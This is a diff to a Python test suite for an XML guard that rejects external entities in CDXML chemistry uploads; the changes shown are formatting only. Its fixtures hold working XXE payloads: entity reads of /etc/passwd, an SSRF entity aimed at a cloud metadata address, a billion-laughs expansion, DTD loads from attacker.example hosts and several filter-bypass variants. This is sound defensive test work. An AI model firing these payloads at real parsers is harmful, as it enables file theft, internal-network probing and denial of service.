@@ -19,13 +19,12 @@ from app.services.format_detector import detect_format
 from app.services.xml_guard import reject_xml_external_entities
 
 BENIGN_CDXML = (
-    b'<?xml version="1.0"?>\n'
-    b"<CDXML><page><fragment>C</fragment></page></CDXML>"
+    b'<?xml version="1.0"?>\n<CDXML><page><fragment>C</fragment></page></CDXML>'
 )
 
 ALLOWED_DOCTYPE_CDXML_REVVITY = (
     b'<?xml version="1.0" encoding="UTF-8"?>\n'
-    b'<!DOCTYPE CDXML SYSTEM '
+    b"<!DOCTYPE CDXML SYSTEM "
     b'"https://static.chemistry.revvitycloud.com/cdxml/CDXML.dtd">\n'
     b"<CDXML><page><fragment>C</fragment></page></CDXML>"
 )
@@ -83,9 +82,9 @@ def test_cdx_binary_never_reaches_xml_guard() -> None:
 
 XXE_FILE_READ = (
     b'<?xml version="1.0"?>\n'
-    b'<!DOCTYPE CDXML [\n'
+    b"<!DOCTYPE CDXML [\n"
     b'  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n'
-    b']>\n'
+    b"]>\n"
     b"<CDXML><page><fragment>&xxe;</fragment></page></CDXML>"
 )
 
@@ -107,9 +106,9 @@ def test_xxe_file_read_rejected_via_detect_format() -> None:
 
 XXE_SSRF = (
     b'<?xml version="1.0"?>\n'
-    b'<!DOCTYPE CDXML [\n'
+    b"<!DOCTYPE CDXML [\n"
     b'  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">\n'
-    b']>\n'
+    b"]>\n"
     b"<CDXML><page/></CDXML>"
 )
 
@@ -126,11 +125,11 @@ def test_xxe_ssrf_rejected() -> None:
 
 BILLION_LAUGHS = (
     b'<?xml version="1.0"?>\n'
-    b'<!DOCTYPE lolz [\n'
+    b"<!DOCTYPE lolz [\n"
     b'  <!ENTITY lol "lol">\n'
     b'  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">\n'
     b'  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">\n'
-    b']>\n'
+    b"]>\n"
     b"<CDXML><page>&lol2;</page></CDXML>"
 )
 
@@ -147,10 +146,10 @@ def test_billion_laughs_rejected() -> None:
 
 PARAM_ENTITY = (
     b'<?xml version="1.0"?>\n'
-    b'<!DOCTYPE CDXML [\n'
+    b"<!DOCTYPE CDXML [\n"
     b'  <!ENTITY % p SYSTEM "http://attacker.example/xxe.dtd">\n'
-    b'  %p;\n'
-    b']>\n'
+    b"  %p;\n"
+    b"]>\n"
     b"<CDXML><page/></CDXML>"
 )
 
@@ -167,9 +166,9 @@ def test_parameter_entity_rejected() -> None:
 
 CASE_MIXED = (
     b'<?xml version="1.0"?>\n'
-    b'<!doctype CDXML [\n'
+    b"<!doctype CDXML [\n"
     b'  <!eNtItY xxe SYSTEM "file:///etc/hostname">\n'
-    b']>\n'
+    b"]>\n"
     b"<CDXML/>"
 )
 
@@ -222,7 +221,7 @@ def test_allowed_url_in_comment_after_evil_doctype_rejected() -> None:
     payload = (
         b'<?xml version="1.0"?>\n'
         b'<!DOCTYPE CDXML SYSTEM "http://attacker.example.com/exfil.dtd">\n'
-        b'<!-- http://www.cambridgesoft.com/xml/cdxml.dtd -->\n'
+        b"<!-- http://www.cambridgesoft.com/xml/cdxml.dtd -->\n"
         b"<CDXML/>"
     )
     with pytest.raises(FormatDetectionError):
@@ -232,7 +231,7 @@ def test_allowed_url_in_comment_after_evil_doctype_rejected() -> None:
 def test_allowed_url_as_suffix_of_attacker_url_rejected() -> None:
     payload = (
         b'<?xml version="1.0"?>\n'
-        b'<!DOCTYPE CDXML SYSTEM '
+        b"<!DOCTYPE CDXML SYSTEM "
         b'"http://attacker.example.com/spoof-http://www.cambridgesoft.com/xml/cdxml.dtd">\n'
         b"<CDXML/>"
     )
@@ -254,7 +253,7 @@ def test_allowed_url_in_processing_instruction_after_evil_doctype_rejected() -> 
     payload = (
         b'<?xml version="1.0"?>\n'
         b'<!DOCTYPE CDXML SYSTEM "http://attacker.example.com/exfil.dtd">\n'
-        b'<?foo http://www.cambridgesoft.com/xml/cdxml.dtd ?>\n'
+        b"<?foo http://www.cambridgesoft.com/xml/cdxml.dtd ?>\n"
         b"<CDXML/>"
     )
     with pytest.raises(FormatDetectionError):
@@ -280,7 +279,7 @@ def test_doctype_with_internal_subset_but_no_entity_rejected() -> None:
     still trigger XXE."""
     payload = (
         b'<?xml version="1.0"?>\n'
-        b'<!DOCTYPE CDXML [ <!-- benign-looking comment --> ]>\n'
+        b"<!DOCTYPE CDXML [ <!-- benign-looking comment --> ]>\n"
         b"<CDXML/>"
     )
     with pytest.raises(FormatDetectionError):
@@ -343,7 +342,9 @@ def test_doctype_deep_in_prolog_still_caught() -> None:
     pad = b" " * 50_000
     payload = (
         b'<?xml version="1.0"?>\n'
-        + b"<!-- " + pad + b" -->\n"
+        + b"<!-- "
+        + pad
+        + b" -->\n"
         + b'<!DOCTYPE CDXML [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
         + b"<CDXML/>"
     )
@@ -360,11 +361,7 @@ def test_guard_performance_bounded() -> None:
     """A 50 MB garbage payload must not take noticeable CPU in the guard."""
     import time
 
-    big = (
-        b'<?xml version="1.0"?>\n<CDXML>'
-        + (b"X" * (50 * 1024 * 1024))
-        + b"</CDXML>"
-    )
+    big = b'<?xml version="1.0"?>\n<CDXML>' + (b"X" * (50 * 1024 * 1024)) + b"</CDXML>"
     t0 = time.perf_counter()
     reject_xml_external_entities(big)
     elapsed = time.perf_counter() - t0
